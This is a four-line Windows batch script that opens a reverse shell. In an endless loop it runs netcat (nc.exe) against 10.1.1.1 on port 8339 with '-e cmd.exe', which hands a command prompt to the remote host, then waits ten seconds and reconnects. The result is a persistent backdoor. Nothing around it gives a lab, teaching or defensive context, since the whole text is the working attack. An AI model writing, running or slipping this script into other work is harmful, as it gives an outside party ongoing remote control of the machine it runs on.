:loop
nc.exe 10.1.1.1 8339 -e cmd.exe
timeout /t 10
goto loop
